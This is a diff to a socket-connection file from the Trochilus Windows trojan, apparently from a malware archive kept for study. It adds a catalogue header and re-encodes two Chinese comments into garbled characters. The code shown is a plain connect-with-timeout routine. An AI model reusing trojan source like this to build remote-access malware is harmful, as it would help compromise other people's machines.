@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include <MSTCPiP.h>
 #include "MySocket.h"
@@ -141,7 +152,7 @@ BOOL MySocket::Connect( ULONG ip, UINT nHostPort, DWORD dwTimeoutSeconds /*= 4*/
 	clientService.sin_addr.s_addr = ip;
 	clientService.sin_port = htons( nHostPort );
 	
-	//ÉèÖÃÎª·Ç×èÈûÄ£Ê½
+	//ï¿½ï¿½ï¿½ï¿½Îªï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä£Ê½
 	ULONG ul = 1;
 	::ioctlsocket(m_socket, FIONBIO, &ul);
 
@@ -172,7 +183,7 @@ BOOL MySocket::Connect( ULONG ip, UINT nHostPort, DWORD dwTimeoutSeconds /*= 4*/
 		}
 	}
 
-	//ÉèÖÃÎª×èÈûÄ£Ê½
+	//ï¿½ï¿½ï¿½ï¿½Îªï¿½ï¿½ï¿½ï¿½Ä£Ê½
 	ul = 0;
 	::ioctlsocket(m_socket, FIONBIO, &ul);
 
